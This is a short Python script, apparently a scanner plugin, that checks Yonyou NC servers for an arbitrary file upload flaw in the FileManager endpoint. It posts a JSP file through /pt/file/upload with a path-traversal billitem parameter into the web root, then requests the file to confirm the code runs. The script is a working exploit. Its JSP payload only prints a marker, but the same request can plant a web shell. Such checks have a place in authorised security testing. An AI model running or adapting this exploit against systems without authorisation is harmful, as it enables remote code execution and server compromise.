import requests
import urllib

from inc.generate_random import generate_random_str
def verify(url):
    relsult = {
        'name': '用友NC系统FileManager接口存在任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Content-Type': 'multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305'
    }
    char = generate_random_str(6)
    char_data = generate_random_str(15)
    data = f'''--d0b7a0d40eed0e32904c8017b09eb305
    Content-Disposition: form-data; name="file"; filename="{char}.jsp" 
    Content-Type: text/plain

    <%out.print("{char_data}");%>
    --d0b7a0d40eed0e32904c8017b09eb305--'''
    vurl = urllib.parse.urljoin(url, "/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            vurl = url + f'/{char}.jsp'
            response = requests.get(vurl)
            if response.status_code == 200 and char_data in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult